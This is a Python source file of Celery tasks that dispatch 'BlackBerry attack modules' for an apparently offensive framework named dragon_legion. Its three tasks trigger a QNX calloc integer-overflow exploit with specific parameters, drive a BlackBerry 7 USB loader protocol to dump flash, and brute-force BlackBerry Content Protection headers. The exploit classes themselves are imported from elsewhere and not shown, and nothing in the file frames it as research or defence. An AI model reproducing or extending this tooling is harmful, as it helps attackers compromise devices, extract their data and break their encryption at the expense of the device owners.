"""Celery tasks for BlackBerry attack modules."""

from celery import shared_task
from celery.utils.log import get_task_logger

logger = get_task_logger(__name__)


@shared_task(bind=True, max_retries=2)
def execute_bb10_qnx_exploit(self, attack_id: str, device_id: str,
                             attack_vector: str, params: dict) -> dict:
    """Execute QNX Neutrino exploit against BlackBerry 10."""
    logger.info("Executing BB10 QNX exploit on device %s", device_id)
    from dragon_legion.modules.blackberry import QNXExploit

    qnx = QNXExploit(device_path=params.get("device", "/dev/hd0"))
    overflow_triggered = qnx.calloc_overflow(nmemb=0x40000001, size=4)
    return {
        "attack_id": attack_id,
        "status": "completed",
        "module": "bb10_qnx",
        "overflow_triggered": overflow_triggered,
    }


@shared_task(bind=True, max_retries=2)
def execute_bb7_loader(self, attack_id: str, device_id: str,
                       attack_vector: str, params: dict) -> dict:
    """Execute BlackBerry 7 loader protocol for flash dump."""
    logger.info("Executing BB7 loader on device %s", device_id)
    import usb
    from dragon_legion.modules.blackberry import BlackBerryLoaderProtocol

    dev = usb.core.find(idVendor=0x0FCA, idProduct=0x8001)
    if dev is None:
        return {"attack_id": attack_id, "status": "error", "error": "No BB loader device found"}

    loader = BlackBerryLoaderProtocol(dev)
    if loader.handshake():
        info = loader.get_device_info()
        return {
            "attack_id": attack_id,
            "status": "completed",
            "module": "bb7_loader",
            "device_info": info,
        }
    return {"attack_id": attack_id, "status": "failed", "module": "bb7_loader"}


@shared_task(bind=True, max_retries=3)
def execute_fips_bruteforce(self, attack_id: str, device_id: str,
                            attack_vector: str, params: dict) -> dict:
    """GPU-accelerated FIPS 140-2 brute-force for BlackBerry Content Protection."""
    logger.info("Starting FIPS brute-force for device %s", device_id)
    from dragon_legion.modules.blackberry import FIPSCryptoBruteForce

    bf = FIPSCryptoBruteForce()
    data_path = params.get("protection_db_path", "")
    if data_path:
        with open(data_path, "rb") as f:
            header = bf.parse_protection_header(f.read())
        return {
            "attack_id": attack_id,
            "status": "completed",
            "module": "bb_fips",
            "header_found": header is not None,
        }
    return {"attack_id": attack_id, "status": "error", "error": "No DB path provided"}
